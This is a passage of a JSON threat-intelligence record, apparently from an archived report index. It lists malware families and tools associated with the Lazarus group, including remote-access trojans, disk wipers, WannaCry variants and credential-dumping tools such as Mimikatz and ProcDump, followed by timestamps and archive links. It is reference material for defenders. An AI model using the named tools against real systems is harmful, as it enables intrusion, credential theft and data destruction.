                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535797,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1653787422,
    "ts_modification_date": 1653787422,
    "files": {
        "pdf": "https://archive.orkl.eu/7f9a0d22c62685ec3cc2c2436299ee6e88bfbad0.pdf",
        "text": "https://archive.orkl.eu/7f9a0d22c62685ec3cc2c2436299ee6e88bfbad0.txt",
        "img": "https://archive.orkl.eu/7f9a0d22c62685ec3cc2c2436299ee6e88bfbad0.jpg"
    }
}